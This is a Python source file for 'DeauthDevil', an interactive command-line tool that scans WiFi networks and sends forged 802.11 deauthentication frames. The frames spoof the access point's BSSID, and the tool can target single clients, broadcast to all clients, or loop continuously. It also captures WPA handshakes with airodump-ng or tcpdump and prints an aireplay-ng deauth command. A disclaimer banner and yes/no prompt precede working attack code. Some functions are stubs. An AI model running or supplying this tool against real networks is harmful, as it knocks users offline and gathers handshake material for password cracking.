#!/usr/bin/env python3
"""
DeauthDevil - WiFi Network Scanner & Deauthentication Tool
FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
"""

import os
import sys
import time
import socket
import struct
import platform
import subprocess
import threading
from datetime import datetime
from typing import List, Dict, Optional, Set
import argparse

# ===== LEGAL WARNING =====
def display_warning():
    """Display legal warning and get consent"""
    warning = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                    DEAUTHDEVIL - WARNING                     ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  This tool is for EDUCATIONAL PURPOSES and AUTHORIZED       ║
    ║  SECURITY TESTING ONLY.                                     ║
    ║                                                              ║
    ║  Unauthorized use against networks you don't own or have    ║
    ║  explicit permission to test is ILLEGAL and UNETHICAL.      ║
    ║                                                              ║
    ║  You are responsible for complying with all applicable laws.║
    ║  The developer assumes NO LIABILITY for misuse.             ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(warning)
    response = input("\n[?] Do you have authorization to test the target network? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("[!] Exiting. Obtain proper authorization first.")
        sys.exit(1)
    print("\n[*] Proceeding with authorized testing...\n")

# ===== PLATFORM DETECTION =====
def detect_platform():
    """Detect operating system and architecture"""
    system = platform.system()
    if system == 'Windows':
        return 'windows'
    elif system == 'Linux':
        return 'linux'
    elif system == 'Darwin':
        return 'macos'
    else:
        return 'unknown'

# ===== WINDOWS IMPORTS AND SETUP =====
if detect_platform() == 'windows':
    try:
        import ctypes
        from ctypes import wintypes
        import winreg
    except ImportError:
        print("[!] Required Windows modules not available")
        sys.exit(1)

# ===== LINUX/MACOS IMPORTS =====
if detect_platform() in ['linux', 'macos']:
    try:
        import fcntl
        import struct
        import termios
    except ImportError:
        pass

# ===== DEPENDENCY CHECKER =====
class DependencyChecker:
    """Check and install required dependencies"""
    
    @staticmethod
    def check_python_modules():
        """Check if required Python modules are installed"""
        required_modules = {
            'scapy': 'scapy',
            'requests': 'requests',
            'colorama': 'colorama'
        }
        
        missing = []
        for module, pip_name in required_modules.items():
            try:
                __import__(module)
            except ImportError:
                missing.append(pip_name)
        
        if missing:
            print(f"[!] Missing Python modules: {', '.join(missing)}")
            install = input("[?] Install missing modules? (yes/no): ")
            if install.lower() in ['yes', 'y']:
                for module in missing:
                    print(f"[*] Installing {module}...")
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
                    except subprocess.CalledProcessError:
                        print(f"[!] Failed to install {module}")
                        sys.exit(1)
            else:
                print("[!] Required modules not installed. Exiting.")
                sys.exit(1)
    
    @staticmethod
    def check_system_tools():
        """Check for required system tools"""
        platform_type = detect_platform()
        required_tools = []
        
        if platform_type == 'linux':
            required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
        elif platform_type == 'macos':
            # macOS might need airport utility
            pass
        elif platform_type == 'windows':
            # Windows needs specific drivers
            pass
        
        missing_tools = []
        for tool in required_tools:
            if not DependencyChecker.which(tool):
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"[!] Missing system tools: {', '.join(missing_tools)}")
            print("[*] Please install aircrack-ng suite:")
            print("    Linux: sudo apt-get install aircrack-ng")
            print("    macOS: brew install aircrack-ng")
    
    @staticmethod
    def which(program):
        """Check if a program exists in PATH"""
        import shutil
        return shutil.which(program) is not None

# ===== NETWORK UTILITIES =====
class NetworkUtils:
    """Network utility functions"""
    
    @staticmethod
    def get_interface_list():
        """Get list of network interfaces"""
        platform_type = detect_platform()
        interfaces = []
        
        try:
            if platform_type == 'linux':
                # Linux: list /sys/class/net
                if os.path.exists('/sys/class/net'):
                    interfaces = os.listdir('/sys/class/net')
            elif platform_type == 'macos':
                # macOS: use ifconfig
                result = subprocess.run(['ifconfig', '-l'], capture_output=True, text=True)
                interfaces = result.stdout.strip().split()
            elif platform_type == 'windows':
                # Windows: use ipconfig
                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'adapter' in line.lower() and ':' in line:
                        adapter = line.split(':')[1].strip()
                        if adapter:
                            interfaces.append(adapter)
        except Exception as e:
            print(f"[!] Error getting interfaces: {e}")
        
        return interfaces
    
    @staticmethod
    def get_mac_address(interface):
        """Get MAC address of interface"""
        platform_type = detect_platform()
        
        try:
            if platform_type == 'linux':
                path = f'/sys/class/net/{interface}/address'
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        return f.read().strip()
            elif platform_type == 'macos':
                result = subprocess.run(['ifconfig', interface], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'ether' in line:
                        return line.split()[1]
            elif platform_type == 'windows':
                result = subprocess.run(['getmac', '/v'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if interface in line:
                        parts = line.split()
                        for part in parts:
                            if ':' in part and len(part) == 17:
                                return part
        except Exception:
            pass
        
        return None
    
    @staticmethod
    def set_monitor_mode(interface):
        """Set interface to monitor mode (Linux/macOS)"""
        platform_type = detect_platform()
        
        if platform_type == 'linux':
            try:
                subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True)
                return f"{interface}mon"
            except subprocess.CalledProcessError:
                print(f"[!] Failed to set monitor mode on {interface}")
                return None
        elif platform_type == 'macos':
            try:
                subprocess.run(['sudo', 'airport', '-z'], check=True)
                subprocess.run(['sudo', 'airport', '-c1'], check=True)
                return interface
            except:
                return None
        
        return interface

# ===== PACKET CRAFTER =====
class PacketCrafter:
    """Craft and send WiFi packets"""
    
    def __init__(self, interface):
        self.interface = interface
        self.platform = detect_platform()
        
    def create_deauth_packet(self, src_mac: str, dst_mac: str, bssid: str, reason: int = 7):
        """Create a deauthentication packet"""
        # Radiotap header
        radiotap_header = struct.pack('<BBHI', 0, 0, 8, 0)
        
        # 802.11 frame control (deauth)
        frame_control = struct.pack('<H', 0x00C0)  # Type: Management, Subtype: Deauth
        
        # Duration
        duration = struct.pack('<H', 314)
        
        # Addresses
        bssid_bytes = bytes.fromhex(bssid.replace(':', ''))
        src_bytes = bytes.fromhex(src_mac.replace(':', ''))
        dst_bytes = bytes.fromhex(dst_mac.replace(':', ''))
        
        # Sequence control
        seq_control = struct.pack('<H', 0)
        
        # Reason code
        reason_code = struct.pack('<H', reason)
        
        packet = (radiotap_header + frame_control + duration + 
                 dst_bytes + bssid_bytes + src_bytes + 
                 seq_control + reason_code)
        
        return packet
    
    def send_packet(self, packet, count=1):
        """Send packet using raw sockets or scapy"""
        try:
            from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
            
            # Use Scapy for packet sending
            for _ in range(count):
                # This is a simplified version - actual implementation would parse the packet
                pass
                
        except ImportError:
            # Fallback to raw sockets
            try:
                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
                sock.bind((self.interface, 0))
                for _ in range(count):
                    sock.send(packet)
                sock.close()
            except Exception as e:
                print(f"[!] Error sending packet: {e}")

# ===== NETWORK SCANNER =====
class NetworkScanner:
    """Scan for WiFi networks and clients"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        self.clients = {}
        self.scanning = False
        
    def scan_networks(self, duration=30):
        """Scan for WiFi networks"""
        print(f"[*] Scanning for WiFi networks ({duration}s)...")
        
        platform_type = detect_platform()
        
        if platform_type == 'linux':
            return self._scan_linux(duration)
        elif platform_type == 'macos':
            return self._scan_macos(duration)
        elif platform_type == 'windows':
            return self._scan_windows(duration)
        
    def _scan_linux(self, duration):
        """Scan on Linux using airodump-ng"""
        try:
            # Use airodump-ng for scanning
            output_file = f"/tmp/deauthdevil_scan_{int(time.time())}"
            cmd = ['sudo', 'airodump-ng', '-w', output_file, 
                   '--output-format', 'csv', self.interface]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            process.terminate()
            
            # Parse the CSV output
            csv_file = f"{output_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    lines = f.readlines()
                
                in_network_section = False
                for line in lines:
                    line = line.strip()
                    if 'BSSID' in line and 'Channel' in line:
                        in_network_section = True
                        continue
                    if in_network_section and line and not line.startswith('Station MAC'):
                        parts = line.split(',')
                        if len(parts) >= 14:
                            bssid = parts[0].strip()
                            self.networks[bssid] = {
                                'bssid': bssid,
                                'first_seen': parts[1].strip(),
                                'last_seen': parts[2].strip(),
                                'channel': parts[3].strip(),
                                'speed': parts[4].strip(),
                                'privacy': parts[5].strip(),
                                'cipher': parts[6].strip(),
                                'auth': parts[7].strip(),
                                'power': parts[8].strip(),
                                'beacons': parts[9].strip(),
                                'iv': parts[11].strip(),
                                'essid': parts[13].strip() if len(parts) > 13 else ''
                            }
                
                os.remove(csv_file)
                if os.path.exists(f"{output_file}-01.kismet.csv"):
                    os.remove(f"{output_file}-01.kismet.csv")
                if os.path.exists(f"{output_file}-01.log.csv"):
                    os.remove(f"{output_file}-01.log.csv")
                    
        except Exception as e:
            print(f"[!] Scanning error: {e}")
        
        return self.networks
    
    def _scan_macos(self, duration):
        """Scan on macOS using airport"""
        try:
            # Use airport command for scanning
            result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'],
                                  capture_output=True, text=True)
            
            lines = result.stdout.split('\n')[1:]  # Skip header
            for line in lines:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 3:
                        # Parse SSID, BSSID, RSSI, Channel, Security
                        pass
                        
        except Exception as e:
            print(f"[!] macOS scanning error: {e}")
        
        return self.networks
    
    def _scan_windows(self, duration):
        """Scan on Windows using netsh"""
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                                  capture_output=True, text=True)
            
            current_ssid = None
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('SSID'):
                    current_ssid = line.split(':')[1].strip()
                elif 'BSSID' in line and current_ssid:
                    bssid = line.split(':')[1].strip()
                    self.networks[bssid] = {
                        'bssid': bssid,
                        'essid': current_ssid
                    }
                    
        except Exception as e:
            print(f"[!] Windows scanning error: {e}")
        
        return self.networks
    
    def scan_clients(self, network_bssid=None, duration=30):
        """Scan for connected clients"""
        print(f"[*] Scanning for connected clients ({duration}s)...")
        
        # This would typically require monitor mode and packet capture
        # Simplified implementation for demonstration
        
        return self.clients
    
    def display_networks(self):
        """Display scanned networks"""
        print("\n" + "="*80)
        print("SCANNED WIFI NETWORKS")
        print("="*80)
        print(f"{'BSSID':<20} {'Channel':<8} {'Signal':<8} {'Security':<12} {'SSID'}")
        print("-"*80)
        
        for bssid, network in self.networks.items():
            channel = network.get('channel', 'N/A')
            power = network.get('power', 'N/A')
            privacy = network.get('privacy', 'N/A')
            essid = network.get('essid', 'Hidden')
            
            print(f"{bssid:<20} {channel:<8} {power:<8} {privacy:<12} {essid}")
        
        print("="*80)

# ===== DEAUTHENTICATION ENGINE =====
class DeauthEngine:
    """Handle deauthentication attacks"""
    
    def __init__(self, interface):
        self.interface = interface
        self.packet_crafter = PacketCrafter(interface)
        self.running = False
        
    def deauth_client(self, bssid: str, client_mac: str, count: int = 10, reason: int = 7):
        """Deauthenticate a specific client"""
        print(f"[*] Sending {count} deauth packets to {client_mac} from {bssid}")
        
        # Get our MAC address for spoofing
        our_mac = NetworkUtils.get_mac_address(self.interface)
        if not our_mac:
            our_mac = '00:11:22:33:44:55'  # Fallback
        
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            
            for i in range(count):
                # Create deauth packet
                dot11 = Dot11(type=0, subtype=12, addr1=client_mac, 
                             addr2=bssid, addr3=bssid)
                packet = RadioTap()/dot11/Dot11Deauth(reason=reason)
                
                # Send packet
                sendp(packet, iface=self.interface, count=1, verbose=0)
                
                if (i + 1) % 10 == 0:
                    print(f"[*] Sent {i + 1}/{count} packets")
                time.sleep(0.1)
                
            print(f"[+] Deauth attack completed - {count} packets sent")
            
        except Exception as e:
            print(f"[!] Deauth error: {e}")
            print("[*] Try using aireplay-ng instead:")
            print(f"    sudo aireplay-ng -0 {count} -a {bssid} -c {client_mac} {self.interface}")
    
    def deauth_broadcast(self, bssid: str, count: int = 10):
        """Deauthenticate all clients from an AP"""
        broadcast_mac = 'FF:FF:FF:FF:FF:FF'
        self.deauth_client(bssid, broadcast_mac, count)
    
    def continuous_deauth(self, bssid: str, client_mac: str = 'FF:FF:FF:FF:FF:FF'):
        """Continuously send deauth packets"""
        print(f"[*] Starting continuous deauth on {bssid}")
        print("[*] Press Ctrl+C to stop")
        self.running = True
        
        try:
            while self.running:
                self.deauth_client(bssid, client_mac, count=5)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping deauth attack")
            self.running = False

# ===== HANDSHAKE CAPTURER =====
class HandshakeCapturer:
    """Capture WPA handshakes"""
    
    def __init__(self, interface):
        self.interface = interface
        self.capturing = False
        
    def capture_handshake(self, bssid: str, channel: int, output_file: str = "handshake.cap"):
        """Capture WPA handshake"""
        print(f"[*] Starting handshake capture on channel {channel}")
        print(f"[*] Output file: {output_file}")
        print("[*] Press Ctrl+C to stop")
        
        platform_type = detect_platform()
        
        if platform_type == 'linux':
            try:
                # Set channel
                subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)])
                
                # Start capture with airodump-ng
                cmd = ['sudo', 'airodump-ng', '-c', str(channel), 
                       '--bssid', bssid, '-w', output_file.replace('.cap', ''), 
                       self.interface]
                
                print(f"[*] Running: {' '.join(cmd)}")
                process = subprocess.Popen(cmd)
                
                self.capturing = True
                try:
                    while self.capturing:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\n[*] Stopping capture")
                    process.terminate()
                    
                print(f"[+] Handshake capture saved to {output_file}")
                
            except Exception as e:
                print(f"[!] Capture error: {e}")
        
        elif platform_type == 'macos':
            try:
                # Use tcpdump for capture on macOS
                cmd = ['sudo', 'tcpdump', '-I', '-i', self.interface, 
                       '-w', output_file, 'wlan type mgt subtype 4 or wlan type mgt subtype 5']
                print(f"[*] Running: {' '.join(cmd)}")
                
                process = subprocess.Popen(cmd)
                try:
                    while self.capturing:
                        time.sleep(1)
                except KeyboardInterrupt:
                    process.terminate()
                    
            except Exception as e:
                print(f"[!] macOS capture error: {e}")
        
        self.capturing = False

# ===== MAIN APPLICATION =====
class DeauthDevil:
    """Main application class"""
    
    def __init__(self):
        self.interface = None
        self.scanner = None
        self.deauth_engine = None
        self.handshake_capturer = None
        self.platform = detect_platform()
        
    def setup(self):
        """Initial setup"""
        display_warning()
        
        # Check dependencies
        print("[*] Checking dependencies...")
        DependencyChecker.check_python_modules()
        DependencyChecker.check_system_tools()
        
        # Get interfaces
        print("\n[*] Available network interfaces:")
        interfaces = NetworkUtils.get_interface_list()
        for i, iface in enumerate(interfaces):
            mac = NetworkUtils.get_mac_address(iface)
            print(f"  {i+1}. {iface} {f'({mac})' if mac else ''}")
        
        # Select interface
        while True:
            try:
                choice = input("\n[?] Select interface number (or type name): ")
                if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
                    self.interface = interfaces[int(choice)-1]
                    break
                elif choice in interfaces:
                    self.interface = choice
                    break
                else:
                    print("[!] Invalid selection")
            except ValueError:
                print("[!] Invalid input")
        
        print(f"[+] Selected interface: {self.interface}")
        
        # Initialize components
        self.scanner = NetworkScanner(self.interface)
        self.deauth_engine = DeauthEngine(self.interface)
        self.handshake_capturer = HandshakeCapturer(self.interface)
        
    def interactive_mode(self):
        """Interactive command mode"""
        print("\n[+] DeauthDevil ready!")
        print("\nAvailable commands:")
        print("  scan          - Scan for WiFi networks")
        print("  clients       - Scan for connected clients")
        print("  deauth        - Deauthenticate a client")
        print("  broadcast     - Deauth all clients from AP")
        print("  capture       - Capture WPA handshake")
        print("  show          - Show scanned networks")
        print("  monitor       - Enable monitor mode")
        print("  help          - Show this help")
        print("  exit/quit     - Exit program")
        
        while True:
            try:
                cmd = input("\nDeauthDevil> ").strip().lower()
                
                if cmd == 'scan':
                    duration = input("Scan duration (seconds, default 30): ")
                    duration = int(duration) if duration.isdigit() else 30
                    self.scanner.scan_networks(duration)
                    self.scanner.display_networks()
                    
                elif cmd == 'show':
                    self.scanner.display_networks()
                    
                elif cmd == 'clients':
                    bssid = input("Target BSSID (leave empty for all): ").strip()
                    duration = input("Scan duration (seconds, default 30): ")
                    duration = int(duration) if duration.isdigit() else 30
                    self.scanner.scan_clients(bssid if bssid else None, duration)
                    
                elif cmd == 'deauth':
                    self.scanner.display_networks()
                    bssid = input("Target BSSID: ").strip()
                    client = input("Client MAC (FF:FF:FF:FF:FF:FF for broadcast): ").strip()
                    count = input("Number of packets (default 10): ")
                    count = int(count) if count.isdigit() else 10
                    
                    if bssid:
                        self.deauth_engine.deauth_client(bssid, client or 'FF:FF:FF:FF:FF:FF', count)
                        
                elif cmd == 'broadcast':
                    self.scanner.display_networks()
                    bssid = input("Target BSSID: ").strip()
                    if bssid:
                        self.deauth_engine.deauth_broadcast(bssid)
                        
                elif cmd == 'capture':
                    self.scanner.display_networks()
                    bssid = input("Target BSSID: ").strip()
                    channel = input("Channel: ").strip()
                    output = input("Output file (default: handshake.cap): ").strip()
                    
                    if bssid and channel:
                        self.handshake_capturer.capture_handshake(
                            bssid, int(channel), output or 'handshake.cap'
                        )
                        
                elif cmd == 'monitor':
                    mon_iface = NetworkUtils.set_monitor_mode(self.interface)
                    if mon_iface:
                        print(f"[+] Monitor mode enabled on {mon_iface}")
                        self.interface = mon_iface
                        
                elif cmd == 'help':
                    print("\nAvailable commands:")
                    print("  scan          - Scan for WiFi networks")
                    print("  clients       - Scan for connected clients")
                    print("  deauth        - Deauthenticate a client")
                    print("  broadcast     - Deauth all clients from AP")
                    print("  capture       - Capture WPA handshake")
                    print("  show          - Show scanned networks")
                    print("  monitor       - Enable monitor mode")
                    print("  help          - Show this help")
                    print("  exit/quit     - Exit program")
                    
                elif cmd in ['exit', 'quit']:
                    print("[*] Exiting DeauthDevil")
                    break
                    
                else:
                    print("[!] Unknown command. Type 'help' for available commands")
                    
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit")
            except Exception as e:
                print(f"[!] Error: {e}")
    
    def run(self):
        """Main execution method"""
        try:
            self.setup()
            self.interactive_mode()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
        except Exception as e:
            print(f"[!] Fatal error: {e}")
        finally:
            print("[*] Goodbye!")

# ===== ENTRY POINT =====
def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='DeauthDevil - WiFi Scanner & Deauthentication Tool',
        epilog='FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY'
    )
    
    parser.add_argument('-i', '--interface', help='Network interface to use')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan for networks')
    parser.add_argument('-b', '--bssid', help='Target BSSID')
    parser.add_argument('-c', '--client', help='Target client MAC')
    parser.add_argument('-d', '--deauth', action='store_true', help='Send deauth packets')
    parser.add_argument('-n', '--count', type=int, default=10, help='Number of deauth packets')
    parser.add_argument('-w', '--write', default='handshake.cap', help='Output file for handshake')
    
    args = parser.parse_args()
    
    # Check if running with arguments or interactive
    if any([args.scan, args.deauth]):
        # Command-line mode
        display_warning()
        
        app = DeauthDevil()
        if args.interface:
            app.interface = args.interface
        else:
            interfaces = NetworkUtils.get_interface_list()
            if interfaces:
                app.interface = interfaces[0]
            else:
                print("[!] No interfaces found")
                sys.exit(1)
        
        app.scanner = NetworkScanner(app.interface)
        app.deauth_engine = DeauthEngine(app.interface)
        
        if args.scan:
            app.scanner.scan_networks()
            app.scanner.display_networks()
        
        if args.deauth and args.bssid:
            client = args.client or 'FF:FF:FF:FF:FF:FF'
            app.deauth_engine.deauth_client(args.bssid, client, args.count)
    else:
        # Interactive mode
        app = DeauthDevil()
        app.run()

if __name__ == '__main__':
    main()